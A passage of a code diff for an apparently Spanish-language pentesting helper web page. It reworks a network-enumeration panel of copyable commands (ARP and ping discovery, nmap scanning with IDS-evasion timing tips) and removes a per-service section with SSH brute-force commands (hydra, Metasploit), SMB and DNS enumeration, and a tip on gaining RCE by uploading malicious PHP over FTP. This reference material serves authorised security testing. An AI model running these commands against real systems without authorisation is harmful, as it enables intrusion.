@@ -240,6 +240,13 @@ pre.code-block{background:var(--bg);border:1px solid var(--border2);border-radiu
 .noise-low{background:rgba(0,255,136,.1);color:var(--green);border:1px solid rgba(0,255,136,.3);}
 .noise-med{background:rgba(255,204,0,.1);color:var(--yellow);border:1px solid rgba(255,204,0,.3);}
 .noise-high{background:rgba(255,51,68,.1);color:var(--red);border:1px solid rgba(255,51,68,.3);}
+.auth-tag{padding:2px 6px;border-radius:8px;font-size:9px;}
+.auth-none{background:rgba(130,140,150,.12);color:var(--text3);border:1px solid var(--border2);}
+.auth-req{background:rgba(0,170,255,.1);color:var(--cyan);border:1px solid rgba(0,170,255,.3);}
+.enum-accordion.svc-open{border-color:var(--cyan);box-shadow:inset 3px 0 0 var(--cyan);}
+.enum-accordion.svc-open .enum-acc-port{background:var(--cyan);color:var(--bg);border-color:var(--cyan);}
+tr.svc-open-row td{background:rgba(0,170,255,.08);}
+.enum-accordion[hidden],tr[hidden]{display:none!important;}
 .enum-ttl-table{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12px;}
 .enum-ttl-table th{background:var(--bg3);color:var(--text3);padding:6px 12px;text-align:left;font-size:10px;letter-spacing:1px;border-bottom:1px solid var(--border);}
 .enum-ttl-table td{padding:7px 12px;border-bottom:1px solid var(--border);color:var(--text);}
@@ -270,6 +277,8 @@ pre.code-block{background:var(--bg);border:1px solid var(--border2);border-radiu
 .enum-acc-body.open{display:flex;}
 .enum-vectors{font-size:11px;color:var(--text2);line-height:1.8;padding-left:0;list-style:none;}
 .enum-vectors li::before{content:attr(data-n)'. ';color:var(--purple);font-family:var(--mono);}
+.svc-whatis{font-size:12px;color:var(--text2);line-height:1.55;margin-bottom:12px;background:var(--bg3);border-left:2px solid var(--cyan);border-radius:var(--r);padding:7px 10px;}
+.svc-lbl{font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--text3);font-family:var(--mono);margin:10px 0 6px;}
 .enum-note{background:rgba(255,204,0,.06);border:1px solid rgba(255,204,0,.25);border-radius:var(--r);padding:7px 10px;font-size:11px;color:var(--yellow);margin-top:4px;}
 .enum-danger-note{background:rgba(255,51,68,.06);border:1px solid rgba(255,51,68,.25);border-radius:var(--r);padding:7px 10px;font-size:11px;color:var(--red);margin-top:4px;}
 .enum-nmap-section{margin-bottom:20px;}
@@ -313,6 +322,10 @@ pre.code-block{background:var(--bg);border:1px solid var(--border2);border-radiu
 .wv-card-tag{font-size:10px;font-family:var(--mono);color:var(--red);background:rgba(255,51,68,.1);border:1px solid rgba(255,51,68,.3);border-radius:10px;padding:2px 8px;display:inline-block;}
 .wv-card-sub{font-size:11px;color:var(--text3);margin-top:8px;line-height:1.5;}
 .wv-detail-hd{display:flex;align-items:center;gap:12px;margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid var(--border);}
+.wv-owasp-hd{font-size:11px;font-weight:700;letter-spacing:1px;color:var(--cyan);font-family:var(--mono);margin:18px 0 8px;padding-bottom:5px;border-bottom:1px solid var(--border);}
+.wv-owasp-hd small{color:var(--text3);font-weight:400;letter-spacing:0;}
+.wv-arsenal-btn{background:var(--bg3);border:1px solid var(--border2);color:var(--text2);border-radius:var(--r);padding:5px 10px;cursor:pointer;font-size:10px;font-family:var(--mono);transition:all .12s;}
+.wv-arsenal-btn:hover{border-color:var(--purple);color:var(--purple);}
 .wv-back{background:var(--bg3);border:1px solid var(--border2);color:var(--text2);border-radius:var(--r);padding:6px 12px;cursor:pointer;font-size:11px;font-family:var(--mono);flex-shrink:0;}
 .wv-back:hover{border-color:var(--red);color:var(--red);}
 .wv-sec{margin-bottom:18px;}
@@ -651,7 +664,6 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
         <div class="sb-section" style="padding:8px 10px 4px;font-size:9px;color:var(--text3);letter-spacing:1px;margin-top:4px;">IP / RED</div>
         <button class="osint-tool-btn" onclick="selectOsintTool('ip',this)" data-tool="ip">📍 IP Geolocate</button>
         <button class="osint-tool-btn" onclick="selectOsintTool('reverse-dns',this)" data-tool="reverse-dns">↩ Reverse DNS</button>
-        <button class="osint-tool-btn" onclick="selectOsintTool('asn',this)" data-tool="asn">🔗 ASN / BGP</button>
         <button class="osint-tool-btn" onclick="selectOsintTool('shodan',this)" data-tool="shodan">
           👁 Shodan <span class="needs-key">API</span>
         </button>
@@ -682,7 +694,9 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
         <button class="osint-tool-btn" onclick="selectOsintTool('abuseipdb',this)" data-tool="abuseipdb">
           🚨 IP Reputation <span class="needs-key">API</span>
         </button>
-        <button class="osint-tool-btn" onclick="selectOsintTool('malwarebazaar',this)" data-tool="malwarebazaar">☣ MalwareBazaar</button>
+        <button class="osint-tool-btn" onclick="selectOsintTool('malwarebazaar',this)" data-tool="malwarebazaar">
+          ☣ MalwareBazaar <span class="needs-key">API</span>
+        </button>
 
         <div class="sb-section" style="padding:8px 10px 4px;font-size:9px;color:var(--text3);letter-spacing:1px;margin-top:4px;">HISTORIAL</div>
         <div id="osintHistoryList" style="font-size:10px;color:var(--text3);padding:0 6px;"></div>
@@ -748,19 +762,33 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
 
   <!-- CVEs PANEL -->
   <div class="panel" id="panel-cves">
-    <div class="ed-toolbar">
-      <input type="text" id="cveSearch" placeholder="buscar CVE..." oninput="renderCVEs()" class="sel" style="flex:1;min-width:150px;">
+    <div class="ed-toolbar" style="flex-wrap:wrap;">
+      <div style="display:flex;gap:4px;flex-shrink:0;">
+        <button class="os-btn active" id="cveSev-all" onclick="setCveSev('all',this)">Todas</button>
+        <button class="os-btn" id="cveSev-critical" onclick="setCveSev('critical',this)">🔴 Crítica</button>
+        <button class="os-btn" id="cveSev-high" onclick="setCveSev('high',this)">🟠 Alta</button>
+        <button class="os-btn" id="cveSev-medium" onclick="setCveSev('medium',this)">🟡 Media</button>
+        <button class="os-btn" id="cveSev-low" onclick="setCveSev('low',this)">🟢 Baja</button>
+      </div>
+      <input type="text" id="cveSearch" placeholder="buscar CVE o teclea un ID (CVE-AAAA-NNNN)..." oninput="renderCVEs()" class="sel" style="flex:1;min-width:150px;">
+      <button class="btn-outline" onclick="clearCveSearch()" title="Limpiar búsqueda" style="flex-shrink:0;padding:4px 11px;">✕</button>
       <span style="font-size:11px;color:var(--text3);font-family:var(--mono);" id="cveCount"></span>
     </div>
     <div class="cves-body" id="cvesList"><div class="empty-msg">Sin CVEs registrados. Se detectan automáticamente al analizar documentos.</div></div>
   </div>
   <!-- ENUM PANEL -->
   <div class="panel" id="panel-enum">
+    <div style="display:flex;align-items:center;gap:8px;padding:5px 10px;background:var(--bg2);border-bottom:1px solid var(--border);flex-shrink:0;">
+      <span style="font-size:10px;font-family:var(--mono);color:var(--text3);white-space:nowrap;">🎯 OBJETIVO</span>
+      <input type="text" id="enumTarget" placeholder="IP o dominio (ej. 10.10.10.5) — rellena todos los comandos" oninput="applyEnumTarget()"
+        style="max-width:340px;background:var(--bg3);border:1px solid var(--border2);color:var(--text);border-radius:var(--r);padding:3px 9px;font-size:11px;font-family:var(--mono);outline:none;"
+        onfocus="this.style.borderColor='var(--cyan)'" onblur="this.style.borderColor='var(--border2)'">
+      <span style="margin-left:auto;font-size:10px;color:var(--text3);font-family:var(--mono);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;" title="Escanea y enumera únicamente los sistemas incluidos en el alcance autorizado de la auditoría.">🛡 Solo dentro del alcance autorizado</span>
+    </div>
     <div class="enum-subtabs">
-      <button class="enum-stab active" id="estab-discovery" onclick="switchEnumTab('discovery')">🌐 Descubrimiento de Red</button>
-      <button class="enum-stab" id="estab-services" onclick="switchEnumTab('services')">🔍 Análisis de Servicios</button>
-      <button class="enum-stab" id="estab-nmap" onclick="switchEnumTab('nmap')">⚡ Cheatsheet Nmap</button>
-      <button class="enum-stab" id="estab-winad" onclick="switchEnumTab('winad')">🪟 Windows / AD</button>
+      <button class="enum-stab active" id="estab-discovery" onclick="switchEnumTab('discovery')">① 🌐 Descubrir la red</button>
+      <button class="enum-stab" id="estab-scan" onclick="switchEnumTab('scan')">② ⚡ Escanear puertos</button>
+      <button class="enum-stab" id="estab-services" onclick="switchEnumTab('services')">③ 🔍 Enumerar servicios</button>
     </div>
 
     <!-- SECTION 1: Descubrimiento de Red -->
@@ -791,15 +819,15 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
             <div class="enum-cmd-code">sudo netdiscover -r 192.168.1.0/24</div>
             <button class="enum-copy-btn" onclick="enumCopy(this,'sudo netdiscover -r 192.168.1.0/24')">⎘ Copiar</button>
           </div>
-          <div class="enum-cmd-desc">Descubrimiento ARP pasivo — muestra IP, MAC y fabricante. Identifica VMs por fabricante.</div>
-          <div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span>ARP pasivo — escucha sin emitir</span></div>
+          <div class="enum-cmd-desc">Recorre todo el rango de la red enviando peticiones ARP y lista los hosts vivos con su IP, su dirección MAC y el fabricante. El fabricante ayuda a distinguir máquinas virtuales (VMware, VirtualBox) de equipos físicos. Solo funciona dentro de tu misma red local, porque ARP no cruza routers.</div>
+          <div class="enum-meta"><span class="noise-tag noise-med">🟡 Moderado</span><span>ARP activo — emite peticiones por todo el rango</span></div>
         </div>
         <div class="enum-cmd-card">
           <div class="enum-cmd-row">
             <div class="enum-cmd-code">sudo arp-scan 192.168.1.0/24</div>
             <button class="enum-copy-btn" onclick="enumCopy(this,'sudo arp-scan 192.168.1.0/24')">⎘ Copiar</button>
           </div>
-          <div class="enum-cmd-desc">ARP activo, más rápido que netdiscover</div>
+          <div class="enum-cmd-desc">Descubre hosts por ARP igual que netdiscover, pero de forma más rápida y directa. También está limitado a tu red local, ya que ARP no atraviesa routers.</div>
           <div class="enum-meta"><span class="noise-tag noise-med">🟡 Moderado</span><span>Emite paquetes ARP</span></div>
         </div>
         <div class="enum-cmd-card">
@@ -807,7 +835,7 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
             <div class="enum-cmd-code">nmap -sn 192.168.1.0/24</div>
             <button class="enum-copy-btn" onclick="enumCopy(this,'nmap -sn 192.168.1.0/24')">⎘ Copiar</button>
           </div>
-          <div class="enum-cmd-desc">Ping sweep sin escanear puertos. Útil cuando ARP está bloqueado.</div>
+          <div class="enum-cmd-desc">Barrido de ping (ping sweep): comprueba qué hosts responden sin llegar a escanear sus puertos — la opción <code style="color:var(--orange)">-sn</code> desactiva el escaneo de puertos. Útil cuando ARP no sirve, por ejemplo si el objetivo está en otra red al otro lado de un router.</div>
           <div class="enum-meta"><span class="noise-tag noise-med">🟡 Moderado</span><span>ICMP + ARP según entorno</span></div>
         </div>
         <div class="enum-cmd-card">
@@ -815,7 +843,7 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
             <div class="enum-cmd-code">ping -c 1 IP</div>
             <button class="enum-copy-btn" onclick="enumCopy(this,'ping -c 1 IP')">⎘ Copiar</button>
           </div>
-          <div class="enum-cmd-desc">Comprobación individual de conectividad con un host</div>
+          <div class="enum-cmd-desc">Envía un único paquete ICMP (<code style="color:var(--orange)">-c 1</code> = un solo intento) para comprobar si un host concreto está vivo y responde. Si contesta, la respuesta incluye su TTL, que sirve para adivinar el sistema operativo con la tabla de abajo.</div>
           <div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span>Un solo paquete ICMP</span></div>
         </div>
         <div class="enum-cmd-card">
@@ -823,7 +851,7 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
             <div class="enum-cmd-code" style="font-size:10px;">for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i | grep "bytes from" | cut -d' ' -f4 | tr -d ':' &amp; done</div>
             <button class="enum-copy-btn" onclick="enumCopy(this,'for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i | grep &quot;bytes from&quot; | cut -d\' \' -f4 | tr -d \':\' & done')">⎘ Copiar</button>
           </div>
-          <div class="enum-cmd-desc">Ping sweep en bash puro — paralelo, sin herramientas externas</div>
+          <div class="enum-cmd-desc">Barrido de ping casero hecho solo con bash: recorre las 254 direcciones del rango, una a una y en paralelo, y muestra las que contestan. No necesita instalar nada — útil si netdiscover o nmap no están disponibles en la máquina.</div>
           <div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span>ICMP, sin dependencias</span></div>
         </div>
       </div>
@@ -831,44 +859,48 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
       <div class="enum-group">
         <div class="enum-group-title">Interpretación del TTL</div>
         <table class="enum-ttl-table">
-          <thead><tr><th>TTL aproximado</th><th>Sistema Operativo sugerido</th></tr></thead>
+          <thead><tr><th>Sistema Operativo</th><th>TTL inicial</th></tr></thead>
           <tbody>
-            <tr><td>~64</td><td>Linux / Unix</td></tr>
-            <tr><td>~128</td><td>Windows</td></tr>
-            <tr><td>~255</td><td>Router / Switch Cisco</td></tr>
-            <tr><td>~63 ó ~127</td><td>Mismo SO con 1 salto intermedio (ej. VPN de HTB)</td></tr>
+            <tr><td>Linux / Unix</td><td>64</td></tr>
+            <tr><td>macOS</td><td>64</td></tr>
+            <tr><td>Windows</td><td>128</td></tr>
+            <tr><td>Router / Switch Cisco</td><td>255</td></tr>
           </tbody>
         </table>
+        <div class="enum-note" style="margin-top:8px;">💡 Cada equipo emite sus paquetes con un TTL inicial fijo según su sistema operativo. Cada salto de red (cada router que atraviesa el paquete) le resta 1, así que lo que ves al hacer ping es el valor inicial menos el número de saltos: un TTL de 125 es un Windows a 3 saltos; un 63, un Linux a 1 salto.</div>
         <div class="enum-note" style="margin-top:8px;">⚠ En AWS el ping ICMP está desactivado por defecto. Usar <code style="color:var(--orange);background:var(--bg);padding:1px 4px;border-radius:3px;">nmap -Pn</code> como alternativa.</div>
       </div>
 
       <div class="enum-group">
-        <div class="enum-group-title">Generador de comando personalizado</div>
+        <div class="enum-group-title">Rango de red</div>
         <div class="enum-generator">
-          <div class="enum-gen-title">🔧 Construir comando de descubrimiento</div>
           <div class="enum-gen-row">
-            <span class="enum-gen-label">Rango de red</span>
-            <input type="text" class="enum-gen-input" id="genNetRange" value="192.168.1.0/24" oninput="buildNetCmd()" placeholder="192.168.1.0/24">
+            <span class="enum-gen-label">Rango</span>
+            <input type="text" class="enum-gen-input" id="genNetRange" value="192.168.1.0/24" oninput="syncEnumRange()" placeholder="192.168.1.0/24">
           </div>
-          <div class="enum-gen-row">
-            <span class="enum-gen-label">Herramienta</span>
-            <select class="enum-gen-sel" id="genNetTool" onchange="buildNetCmd()">
-              <option value="netdiscover">netdiscover (ARP pasivo)</option>
-              <option value="arp-scan">arp-scan (ARP activo)</option>
-              <option value="nmap">nmap -sn (ping sweep)</option>
-            </select>
-          </div>
-          <div class="enum-output">
-            <code id="genNetOutput">sudo netdiscover -r 192.168.1.0/24</code>
-            <button class="enum-copy-btn" onclick="enumCopy(this,document.getElementById('genNetOutput').textContent)">⎘ Copiar</button>
-          </div>
+          <div style="font-size:10px;color:var(--text3);font-family:var(--mono);margin-top:8px;line-height:1.5;">Gobierna todos los comandos de descubrimiento de arriba. Escribe aquí la máscara (/24, /26…); se rellena sola con el /24 del objetivo.</div>
         </div>
+      </div>
+
+      <div class="enum-group">
+        <details class="enum-nmap-ref">
+          <summary style="cursor:pointer;font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--text3);font-family:var(--mono);padding:8px 0;user-select:none;">📖 Glosario — términos de esta pestaña (clic para desplegar)</summary>
+          <div style="padding-top:10px;">
+            <table class="enum-service-table">
+              <thead><tr><th>Término</th><th>Qué significa</th></tr></thead>
+              <tbody>
+                <tr><td>ARP</td><td>Protocolo que asocia IP ↔ MAC dentro de la red local. No cruza routers.</td></tr>
+                <tr><td>TTL</td><td>Time To Live: contador que cada salto de red resta 1; delata el SO por su valor inicial.</td></tr>
+                <tr><td>CIDR (/24)</td><td>Notación del tamaño de la subred. /24 = 256 direcciones; /26 = 64.</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </details>
       </div>
     </div><!-- /esec-discovery -->
 
-    <!-- SECTION 2: Análisis de Servicios -->
-    <div class="enum-section" id="esec-services">
-
+    <!-- SECTION 2: Escanear puertos (generador Nmap + referencia) -->
+    <div class="enum-section" id="esec-scan">
       <div class="enum-group">
         <div class="enum-group-title">Metodología de dos fases</div>
         <div class="enum-phase-flow">
@@ -877,6 +909,7 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
           <div class="enum-phase-box"><b>FASE 2</b>Solo puertos abiertos<br>análisis profundo</div>
         </div>
         <div class="enum-note">💡 Escanear 65 535 puertos con versiones y scripts es muy lento. Separar el proceso hace la enumeración ~10x más rápida.</div>
+        <div class="enum-meta" style="margin-top:8px;"><span class="noise-tag noise-high">🔴 Ruidoso</span><span>Ojo con <code style="color:var(--orange);background:var(--bg);padding:1px 4px;border-radius:3px;">-A</code> y <code style="color:var(--orange);background:var(--bg);padding:1px 4px;border-radius:3px;">--script vuln</code>: generan mucho tráfico y saltan en cualquier IDS. Para ir discreto, baja el <code style="color:var(--orange);background:var(--bg);padding:1px 4px;border-radius:3px;">-T</code> (T0/T1 son los más lentos y sigilosos) o usa <code style="color:var(--orange);background:var(--bg);padding:1px 4px;border-radius:3px;">--scan-delay</code>.</span></div>
       </div>
 
       <div class="enum-group">
@@ -912,7 +945,7 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
           <div style="border-top:1px solid var(--border);padding-top:10px;margin-top:4px;">
             <div class="enum-gen-row">
               <span class="enum-gen-label">Puertos abiertos</span>
-              <input type="text" class="enum-gen-input" id="nmapPorts" placeholder="21,22,80,443..." oninput="buildNmapCmd()">
+              <input type="text" class="enum-gen-input" id="nmapPorts" placeholder="21,22,80,443..." oninput="onNmapPortsChanged()">
             </div>
             <div class="enum-gen-row">
               <span class="enum-gen-label">Flags fase 2</span>
@@ -939,204 +972,9 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
       </div>
 
       <div class="enum-group">
-        <div class="enum-group-title">Análisis por servicio</div>
-
-        <!-- FTP -->
-        <div class="enum-accordion">
-          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
-            <span class="enum-acc-port">21/TCP</span>
-            <span class="enum-acc-name">FTP — File Transfer Protocol</span>
-            <span class="enum-acc-arrow">▶</span>
-          </div>
-          <div class="enum-acc-body">
-            <ul class="enum-vectors">
-              <li data-n="1">Sesión anónima (usuario: anonymous, pass: vacía)</li>
-              <li data-n="2">Versión vulnerable con exploit conocido</li>
-              <li data-n="3">Credenciales reutilizadas de otros servicios</li>
-            </ul>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">ftp IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'ftp IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conectar — usuario: <code style="color:var(--orange)">anonymous</code>, contraseña vacía</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script ftp-anon IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script ftp-anon IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Detectar acceso anónimo con script NSE</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">searchsploit vsftpd 2.3.4</div><button class="enum-copy-btn" onclick="enumCopy(this,'searchsploit vsftpd 2.3.4')">⎘ Copiar</button></div><div class="enum-cmd-desc">Buscar exploit por versión del servidor</div></div>
-            <div class="enum-note">💡 Si FTP + puerto 80 activos: subir PHP malicioso por FTP y ejecutarlo desde la web = RCE</div>
-          </div>
-        </div>
-
-        <!-- SSH -->
-        <div class="enum-accordion">
-          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
-            <span class="enum-acc-port">22/TCP</span>
-            <span class="enum-acc-name">SSH — Secure Shell</span>
-            <span class="enum-acc-arrow">▶</span>
-          </div>
-          <div class="enum-acc-body">
-            <ul class="enum-vectors">
-              <li data-n="1">Fuerza bruta con credenciales</li>
-              <li data-n="2">Versión vulnerable</li>
-              <li data-n="3">Claves privadas expuestas en el sistema</li>
-            </ul>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">ssh usuario@IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'ssh usuario@IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conexión directa</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">hydra -l usuario -P /usr/share/wordlists/rockyou.txt IP ssh</div><button class="enum-copy-btn" onclick="enumCopy(this,'hydra -l usuario -P /usr/share/wordlists/rockyou.txt IP ssh')">⎘ Copiar</button></div><div class="enum-cmd-desc">Fuerza bruta de contraseña</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script ssh-brute IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script ssh-brute IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Fuerza bruta con script NSE</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">use auxiliary/scanner/ssh/ssh_login</div><button class="enum-copy-btn" onclick="enumCopy(this,'use auxiliary/scanner/ssh/ssh_login')">⎘ Copiar</button></div><div class="enum-cmd-desc">Módulo Metasploit — bruteforce SSH</div></div>
-          </div>
-        </div>
-
-        <!-- Telnet -->
-        <div class="enum-accordion">
-          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
-            <span class="enum-acc-port">23/TCP</span>
-            <span class="enum-acc-name">Telnet</span>
-            <span class="enum-acc-arrow">▶</span>
-          </div>
-          <div class="enum-acc-body">
-            <ul class="enum-vectors">
-              <li data-n="1">Protocolo sin cifrado — credenciales visibles en tráfico</li>
-              <li data-n="2">Credenciales por defecto del dispositivo</li>
-            </ul>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">telnet IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'telnet IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conexión directa</div></div>
-            <div class="enum-danger-note">⚠ Telnet no cifra el tráfico. Cualquier sniffer en la red captura las credenciales en texto claro.</div>
-          </div>
-        </div>
-
-        <!-- SMTP -->
-        <div class="enum-accordion">
-          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
-            <span class="enum-acc-port">25/TCP</span>
-            <span class="enum-acc-name">SMTP — Simple Mail Transfer Protocol</span>
-            <span class="enum-acc-arrow">▶</span>
-          </div>
-          <div class="enum-acc-body">
-            <ul class="enum-vectors">
-              <li data-n="1">Enumeración de usuarios válidos (VRFY / EXPN)</li>
-              <li data-n="2">Open relay — enviar correo como cualquier dominio</li>
-            </ul>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script smtp-enum-users IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script smtp-enum-users IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Enumerar usuarios válidos del servidor</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script smtp-open-relay IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script smtp-open-relay IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Detectar open relay</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">telnet IP 25</div><button class="enum-copy-btn" onclick="enumCopy(this,'telnet IP 25')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conexión manual para pruebas con comandos SMTP</div></div>
-          </div>
-        </div>
-
-        <!-- DNS -->
-        <div class="enum-accordion">
-          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
-            <span class="enum-acc-port">53/TCP+UDP</span>
-            <span class="enum-acc-name">DNS — Domain Name System</span>
-            <span class="enum-acc-arrow">▶</span>
-          </div>
-          <div class="enum-acc-body">
-            <ul class="enum-vectors">
-              <li data-n="1">Zone transfer (AXFR) — vuelca todos los registros DNS</li>
-              <li data-n="2">Subdominios por fuerza bruta</li>
-            </ul>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">dig axfr @IP dominio.com</div><button class="enum-copy-btn" onclick="enumCopy(this,'dig axfr @IP dominio.com')">⎘ Copiar</button></div><div class="enum-cmd-desc">Intentar transferencia de zona completa</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script dns-zone-transfer IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script dns-zone-transfer IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Zone transfer con script NSE</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">dnsrecon -d dominio.com -t axfr</div><button class="enum-copy-btn" onclick="enumCopy(this,'dnsrecon -d dominio.com -t axfr')">⎘ Copiar</button></div><div class="enum-cmd-desc">Reconocimiento DNS completo</div></div>
-          </div>
-        </div>
-
-        <!-- HTTP/S -->
-        <div class="enum-accordion">
-          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
-            <span class="enum-acc-port">80/443</span>
-            <span class="enum-acc-name">HTTP / HTTPS — Web</span>
-            <span class="enum-acc-arrow">▶</span>
-          </div>
-          <div class="enum-acc-body">
-            <ul class="enum-vectors">
-              <li data-n="1">Fuzzing de directorios y archivos ocultos</li>
-              <li data-n="2">Versión vulnerable del servidor web</li>
-              <li data-n="3">CGI habilitado — posible Shellshock</li>
-              <li data-n="4">Información en phpinfo.php, robots.txt, .git/</li>
-            </ul>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">ffuf -u http://IP/FUZZ -w /usr/share/dirb/wordlists/common.txt -c</div><button class="enum-copy-btn" onclick="enumCopy(this,'ffuf -u http://IP/FUZZ -w /usr/share/dirb/wordlists/common.txt -c')">⎘ Copiar</button></div><div class="enum-cmd-desc">Fuzzing básico de directorios</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c</div><button class="enum-copy-btn" onclick="enumCopy(this,'ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c')">⎘ Copiar</button></div><div class="enum-cmd-desc">Fuzzing con SecLists (más completo)</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nikto -h http://IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nikto -h http://IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Escáner automático de vulnerabilidades web</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">curl -I http://IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'curl -I http://IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Ver cabeceras HTTP — versión del servidor</div></div>
-            <div class="enum-note">🔍 Siempre revisar manualmente: <code style="color:var(--orange)">/robots.txt</code> · <code style="color:var(--orange)">/phpinfo.php</code> · <code style="color:var(--orange)">/.git/</code></div>
-          </div>
-        </div>
-
-        <!-- SMB -->
-        <div class="enum-accordion">
-          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
-            <span class="enum-acc-port">139/445</span>
-            <span class="enum-acc-name">SMB — Server Message Block</span>
-            <span class="enum-acc-arrow">▶</span>
-          </div>
-          <div class="enum-acc-body">
-            <ul class="enum-vectors">
-              <li data-n="1">Enumeración de recursos compartidos anónima</li>
-              <li data-n="2">Versión vulnerable — EternalBlue (MS17-010)</li>
-              <li data-n="3">Credenciales débiles o reutilizadas</li>
-            </ul>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">smbclient -N -L //IP/</div><button class="enum-copy-btn" onclick="enumCopy(this,'smbclient -N -L //IP/')">⎘ Copiar</button></div><div class="enum-cmd-desc">Listar recursos compartidos sin credenciales</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">smbclient //IP/recurso -N</div><button class="enum-copy-btn" onclick="enumCopy(this,'smbclient //IP/recurso -N')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conectar a recurso sin credenciales</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">enum4linux -a IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'enum4linux -a IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Enumeración completa SMB / NetBIOS</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script smb-vuln-ms17-010 IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script smb-vuln-ms17-010 IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Detectar EternalBlue</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">use auxiliary/scanner/smb/smb_version</div><button class="enum-copy-btn" onclick="enumCopy(this,'use auxiliary/scanner/smb/smb_version')">⎘ Copiar</button></div><div class="enum-cmd-desc">Módulo Metasploit — versión SMB</div></div>
-          </div>
-        </div>
-
-        <!-- RDP -->
-        <div class="enum-accordion">
-          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
-            <span class="enum-acc-port">3389/TCP</span>
-            <span class="enum-acc-name">RDP — Remote Desktop Protocol</span>
-            <span class="enum-acc-arrow">▶</span>
-          </div>
-          <div class="enum-acc-body">
-            <ul class="enum-vectors">
-              <li data-n="1">Fuerza bruta de credenciales</li>
